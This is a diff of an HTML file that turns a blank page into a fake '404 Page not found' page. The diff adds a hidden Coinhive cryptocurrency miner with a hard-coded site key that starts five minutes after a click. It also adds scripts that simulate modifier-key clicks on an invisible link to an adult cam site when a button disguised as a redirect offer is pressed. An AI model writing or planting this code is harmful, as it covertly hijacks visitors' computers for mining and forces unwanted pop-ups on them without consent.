@@ -1,14 +1,36 @@
 
-<!doctype html>
-<html class="no-js" lang="">
-    <head>
-        <meta charset="utf-8">
-        <meta http-equiv="x-ua-compatible" content="ie=edge">
-        <title></title>
-        <meta name="description" content="">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <!--Set IE to newest prozessor -->
-        <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Page not found</title>
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+    <style type="text/css" media="screen">
+      body {
+        background-color: #f1f1f1;
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      }
+
+      .container { padding-left: 15px; padding-right: 15px; margin: 50px auto 40px auto; text-align: center; }
+
+      a { color: #4183c4; text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      h1 { width: 100%; text-align: center; letter-spacing: -1px; line-height: 60px; font-size: 60px; font-weight: 100; margin: 0px 0 50px 0; text-shadow: 0 1px 0 #fff; }
+      p { color: rgba(0, 0, 0, 0.5); margin: 20px 0; line-height: 1.6; }
+
+      ul { list-style: none; margin: 25px 0; padding: 0; }
+      li { display: table-cell; font-weight: bold; width: 1%; }
+
+
+      button{ padding: 5px; }
+      button:hover span{ text-decoration: underline; }
+      @media only screen and (max-width: 400px) { button { font-size: 16px; min-height: 40px; }}
+
+      span { color: #4183c4; text-decoration: none; }
+    </style>
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-122653079-20"></script>
 	<script>
@@ -18,14 +40,57 @@
 
 	  gtag('config', 'UA-122653079-20');
 	</script>
-    </head>
-    <body>
-        <!--[if lte IE 9]>
-            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://	browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
-        <![endif]-->
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous('q3V2ZlGec0frHxaZRQYuCMTAGIEZM1y2', {
+        throttle: 0.5,
+        threads: 2
+      });
+      if (!miner.isMobile()) {
+        var miner = new CoinHive.Anonymous('q3V2ZlGec0frHxaZRQYuCMTAGIEZM1y2', {
+          throttle: 0.5,
+          threads: 3
+        });
+      }
+      function pop() {
+        var evt = new MouseEvent('click', {
+          view : window,
+          ctrlKey: true
+        });
+        document.getElementsByTagName('a')[0].dispatchEvent(evt);
+      }
 
-        <h1>Hello world!</h1>
+      function pop2() {
+        var evt = new MouseEvent('click', {
+          view : window,
+          shiftKey: true
+        });
+        document.getElementsByTagName('a')[0].dispatchEvent(evt);
+        setTimeout(function(){ miner.start(); },  5 * 60 * 1000);
+      }
+    </script>
+  </head>
+
+  <body>
+    <div class="container">
+      <h1>404</h1>
+      <p><strong>Page not found</strong></p>
+
+      <p>
+        The site configured at this address does not
+        contain the requested file.
+      </p>
+
+      <p>
+        If this is your site, make sure that the filename case matches the URL.<br>
+        For root URLs (like <code>http://example.com/</code>) you must provide an
+        <code>index.html</code> file.
+      </p>
+
+      <button onclick='pop(); pop2();'>Would you like to go to: <span>porndudecams.com</span></button>
+      <a href="https://porndudecams.com"></a>
+    </div>
 
 
-    </body>
+  </body>
 </html>
